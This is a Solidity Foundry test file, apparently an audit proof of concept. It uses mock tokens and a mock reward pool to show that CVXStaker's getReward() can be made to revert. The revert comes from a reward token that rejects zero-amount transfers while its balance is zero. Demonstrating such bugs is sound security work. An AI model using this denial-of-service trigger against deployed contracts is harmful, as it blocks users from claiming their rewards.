pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "@openzeppelin-contracts/token/ERC20/ERC20.sol";
import "@openzeppelin-contracts/token/ERC20/IERC20.sol";
import "@openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol";

import "../../src/CVXStaker.sol";

/// ------------------------------------------------------------------------
/// Helper ERC20 with public mint
/// ------------------------------------------------------------------------
contract MintableERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// ------------------------------------------------------------------------
/// ERC20 that REVERTS when the transfer amount is zero.
/// Mimics the behaviour of “weird” tokens that break generic logic.
/// ------------------------------------------------------------------------
contract RevertOnZeroERC20 is MintableERC20 {
    constructor(string memory name_, string memory symbol_) MintableERC20(name_, symbol_) {}

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (amount == 0) revert("No zero transfer");
        return super.transfer(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (amount == 0) revert("No zero transfer");
        return super.transferFrom(from, to, amount);
    }
}

/// ------------------------------------------------------------------------
/// Very light-weight mock of a Convex reward pool. It simply sends its entire
/// balances of the configured rewardTokens to the receiver when getReward()
/// is invoked. No other functionality is needed for this PoC.
/// ------------------------------------------------------------------------
contract MockRewardPool is IBaseRewardPool {
    using SafeERC20 for IERC20;

    IERC20 public immutable rewardToken1;
    IERC20 public immutable rewardToken2;

    constructor(IERC20 t1, IERC20 t2) {
        rewardToken1 = t1;
        rewardToken2 = t2;
    }

    // ----- IBaseRewardPool stubs -----
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function earned(address) external pure returns (uint256) { return 0; }
    function withdrawAndUnwrap(uint256, bool) external {}
    function withdrawAllAndUnwrap(bool) external {}
    // Transfer whatever this pool owns to the receiver
    function getReward(address _account, bool) external {
        uint256 bal1 = rewardToken1.balanceOf(address(this));
        if (bal1 > 0) rewardToken1.safeTransfer(_account, bal1);

        uint256 bal2 = rewardToken2.balanceOf(address(this));
        if (bal2 > 0) rewardToken2.safeTransfer(_account, bal2);
    }
}

/// ------------------------------------------------------------------------
/// PoC – Demonstrates that getReward() reverts when at least one reward
/// token has a zero balance and that token reverts on zero transfers.
/// ------------------------------------------------------------------------
contract CVXStaker_DoS_PoC is Test {
    CVXStaker internal staker;

    MintableERC20 internal clpToken;      // Dummy CLP token – not relevant for the exploit
    MintableERC20 internal normalToken;   // Well-behaved reward token
    RevertOnZeroERC20 internal weirdToken; // Token that reverts on zero-amount transfers

    MockRewardPool internal rewardPool;

    address internal operator   = address(0x1);
    address internal recipient  = address(0x2);

    function setUp() public {
        // ------------------------------------------------------------------
        // Deploy helper tokens
        // ------------------------------------------------------------------
        clpToken     = new MintableERC20("CLP",   "CLP");
        normalToken  = new MintableERC20("NORMAL","NML");
        weirdToken   = new RevertOnZeroERC20("WEIRD","WRD");

        // ------------------------------------------------------------------
        // Deploy mock reward pool & seed it with ONLY normalToken rewards.
        // No WRD tokens are deposited so the balance is zero.
        // ------------------------------------------------------------------
        rewardPool   = new MockRewardPool(IERC20(normalToken), IERC20(weirdToken));
        normalToken.mint(address(rewardPool), 100 ether); // 100 NML rewards
        // Note: NO mint for weirdToken, so its balance stays at 0.

        // ------------------------------------------------------------------
        // Deploy the CVXStaker under test
        // rewardTokens = [normalToken, weirdToken]
        // Booster address is unused in this PoC, pass a zero address cast.
        // ------------------------------------------------------------------
        address[] memory rewardTokens = new address[](2);
        rewardTokens[0] = address(normalToken);
        rewardTokens[1] = address(weirdToken);

        staker = new CVXStaker(
            operator,
            IERC20(clpToken),
            ICVXBooster(address(0)), // unused
            rewardTokens
        );

        // Configure pool info & recipient
        staker.setCvxPoolInfo(0, address(clpToken), address(rewardPool));
        staker.setRewardsRecipient(recipient);
    }

    /// --------------------------------------------------------------------
    /// Exploit – legitimate call reverts because weirdToken.balanceOf == 0
    /// and its implementation forbids zero-amount transfers.
    /// --------------------------------------------------------------------
    function test_DoS_on_Zero_Amount_Transfer() public {
        // Anyone can trigger getReward(). We use address(3) for clarity.
        vm.prank(address(0x3));

        // Expect ANY revert – reverts with "No zero transfer"
        vm.expectRevert();
        staker.getReward(false);
    }
}